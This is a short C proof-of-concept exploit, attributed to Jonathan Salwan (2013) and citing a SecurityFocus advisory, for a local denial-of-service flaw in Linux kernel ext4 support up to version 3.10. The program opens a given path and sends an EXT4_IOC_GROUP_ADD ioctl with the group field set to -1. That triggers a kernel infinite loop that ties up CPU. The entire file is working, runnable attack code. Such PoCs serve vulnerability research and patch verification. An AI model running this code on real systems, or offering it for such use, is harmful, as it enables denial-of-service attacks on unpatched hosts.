/*
source: http://www.securityfocus.com/bid/60586/info

The Linux Kernel is prone to a local denial-of-service vulnerability.

Local attackers can exploit this issue to trigger an infinite loop which may cause denial-of-service conditions. 
*/

/*
** PoC - kernel <= 3.10 CPU Thread consumption in ext4 support. (Infinite loop)
** Jonathan Salwan - 2013-06-05
*/

#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

struct ext4_new_group_input {
        __u32 group;
        __u64 block_bitmap;
        __u64 inode_bitmap;
        __u64 inode_table;
        __u32 blocks_count;
        __u16 reserved_blocks;
        __u16 unused;
};

#define EXT4_IOC_GROUP_ADD  _IOW('f', 8, struct ext4_new_group_input)

int main(int ac, const char *av[]){
  struct ext4_new_group_input input;
  int fd;

  if (ac < 2){
    printf("Syntax  : %s <ext4 device>\n", av[0]);
    printf("Example : %s /tmp\n", av[0]);
    return -1;
  }

  printf("[+] Opening the ext4 device\n");
  if ((fd = open(av[1], O_RDONLY)) < 0){
    perror("[-] open");
    return -1;
  }

  printf("[+] Trigger the infinite loop\n");
  input.group = -1;
  if (ioctl(fd, EXT4_IOC_GROUP_ADD, &input) < 0){
    perror("[-] ioctl");
  }

  close(fd);
  return 0;
}


